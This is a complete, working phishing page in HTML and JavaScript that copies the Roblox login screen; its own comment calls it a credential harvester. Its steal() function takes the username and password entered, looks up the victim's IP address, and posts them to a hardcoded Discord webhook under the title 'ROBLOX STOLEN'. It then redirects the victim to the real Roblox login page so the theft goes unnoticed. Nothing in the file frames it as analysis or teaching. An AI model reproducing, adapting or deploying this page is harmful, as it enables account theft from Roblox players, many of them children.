<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #0B1E33;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }
        .login-card {
            background: white;
            border-radius: 12px;
            padding: 40px 32px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 32px;
            font-weight: 800;
            color: #1C2B4E;
            letter-spacing: -0.5px;
        }
        .logo p {
            color: #5E6C86;
            font-size: 14px;
            margin-top: 5px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1C2B4E;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 14px;
            font-size: 16px;
            border: 1px solid #C8CDD8;
            border-radius: 8px;
            background: white;
            transition: all 0.2s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #00A2FF;
            box-shadow: 0 0 0 3px rgba(0,162,255,0.2);
        }
        .login-btn {
            width: 100%;
            background: #00A2FF;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #0077CC;
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-top: 24px;
            font-size: 13px;
        }
        .footer-links a {
            color: #00A2FF;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .error-msg {
            color: #D32F2F;
            font-size: 13px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="login-card">
        <div class="logo">
            <h1>ROBLOX</h1>
            <p>Join millions of players</p>
        </div>
        <div class="input-group">
            <label>Username</label>
            <input type="text" id="username" placeholder="Enter username" autocomplete="off">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Enter password">
        </div>
        <button class="login-btn" onclick="steal()">Log In</button>
        <div class="footer-links">
            <a href="#">Forgot Password?</a>
            <a href="#">Sign Up</a>
        </div>
        <div id="errorMsg" class="error-msg">Please fill in both fields</div>
    </div>
</div>
<script>
    // palofsc: Roblox credential harvester v2 - realistic UI
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1508539400303280198/n25-sRdGEn79VYA3tT7-81wdx5KMgr7Fib9fK9MUpZ1qFKAbzr0A3zLcioRsMiVhavGF";

    async function steal() {
        let user = document.getElementById("username").value.trim();
        let pass = document.getElementById("password").value;
        let errorDiv = document.getElementById("errorMsg");

        if (!user || !pass) {
            errorDiv.style.display = "block";
            return;
        }
        errorDiv.style.display = "none";

        let ip = await getIP();
        let embed = {
            embeds: [{
                title: "ROBLOX STOLEN",
                color: 0x00A2FF,
                fields: [
                    { name: "Username", value: user, inline: true },
                    { name: "Password", value: pass, inline: true },
                    { name: "IP Address", value: ip, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(embed)
        }).then(() => {
            window.location.href = "https://www.roblox.com/login";
        }).catch(() => {
            window.location.href = "https://www.roblox.com/login";
        });
    }

    async function getIP() {
        try {
            let res = await fetch("https://api.ipify.org?format=json");
            let data = await res.json();
            return data.ip;
        } catch(e) {
            return "unknown";
        }
    }
</script>
</body>
</html>
